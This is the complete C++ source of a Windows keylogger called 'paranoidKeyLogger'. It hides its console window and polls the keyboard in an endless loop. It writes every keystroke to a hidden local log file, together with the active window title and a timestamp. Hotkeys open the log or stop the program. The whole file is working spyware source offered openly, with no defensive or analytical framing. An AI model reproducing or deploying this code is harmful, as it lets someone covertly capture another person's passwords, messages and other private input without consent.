//                    ___ 	|
//                   / __)	| Author	: Amine Reda Saf
//    ____ ___  ____| |__ 	|
//   / ___)___)/ _  |  __)	| Github	: https://github.com/amineredasaf
//  | |  |___ ( ( | | |   	|
//  |_|  (___/ \_||_|_|   	| Name		: paranoidKeyLogger
//                        	|

#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <winternl.h>

// log file path
#define LOGF_PATH ".\\log"
using namespace std;

char prevWindow[256] = "";
char currWindow[256] = "";


void StealthMode(){
    HWND stealth;
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
    
}

char* getTime(){
	    time_t current_time = time(NULL);
        char *dt = ctime(&current_time);
		return dt;
}

bool getMyCurrentWindow(){
	HWND hwnd = GetForegroundWindow();
	if (hwnd == NULL){
		return NULL;
	}
 	GetWindowText(hwnd, currWindow, sizeof(currWindow));
	if (strcmp(prevWindow, currWindow) != 0){
		strcpy(prevWindow, currWindow);
		return true;
	}
	return false;
}

void mainLogger(int key){

	bool winChanged = getMyCurrentWindow();
	if (winChanged){

		char* rawtime = getTime();
		std::ofstream tmpfile;
		FILE *OutFile = fopen(LOGF_PATH, "a+");
		if (OutFile == NULL){
			return;
		}
		fprintf(OutFile, "\n----------------------------\n- At The Time : %s.", rawtime);
		fprintf(OutFile, "\n- On The Window : %s.\n----------------------------\n", currWindow);
		fclose(OutFile);
	}


	if (GetAsyncKeyState(VK_CONTROL) & 0x8000 && GetAsyncKeyState(VK_SHIFT) & 0x8000 && GetAsyncKeyState('S') & 0x8000)
	    ShellExecute(0, "open", LOGF_PATH, 0, 0, SW_SHOW);
 	if (GetAsyncKeyState(VK_CONTROL) & 0x8000 && GetAsyncKeyState(VK_SHIFT) & 0x8000 && GetAsyncKeyState('Q') & 0x8000)
    	exit(0);
	FILE *OutFile = fopen(LOGF_PATH, "a+");
    if (key == VK_SHIFT)
        fprintf(OutFile, "%s", "[SHIFT]");
    else if (key == VK_RETURN)
        fprintf(OutFile, "%s", "[RETURN]");
    else if (key == VK_BACK)
        fprintf(OutFile, "%s", "[BACK SPACE]");
    else if (key == VK_LBUTTON)
        fprintf(OutFile, "%s", "[LButton]");
    else if (key == VK_ESCAPE)
        fprintf(OutFile, "%s", "[ESCAPE]");
    else if (key == VK_CONTROL)
        fprintf(OutFile, "%s", "[CTRL]");
    else if (key == VK_CAPITAL)
        fprintf(OutFile, "%s", "[CAPS_LOCK]");
    else if (key == VK_MENU)
        fprintf(OutFile, "%s", "[ALT]");
    else if (key == VK_TAB)
        fprintf(OutFile, "%s", "[TAB]");
    else if (key == VK_LEFT)
        fprintf(OutFile, "%s", "[LEFT_ARROW]");
    else if (key == VK_RIGHT)
        fprintf(OutFile, "%s", "[LEFT_RIGHT]");
    else if (key == VK_UP)
        fprintf(OutFile, "%s", "[LEFT_UP]");
    else if (key == VK_DOWN)
        fprintf(OutFile, "%s", "[LEFT_DOWN]");
    else if (key == VK_SPACE)
        fprintf(OutFile, "%s", "[SPACE_KEY]");
    else
        fprintf(OutFile, "%s", &key);
	fclose(OutFile);

}

int main(void){

	std::ofstream tmpfile;
	FreeConsole();
	while (1){
		for (int i = 8; i <= 190; i++){
			if (GetAsyncKeyState(i) == -32767){
				StealthMode();
				mainLogger(i);
			}
		}
	}
	tmpfile.close();
}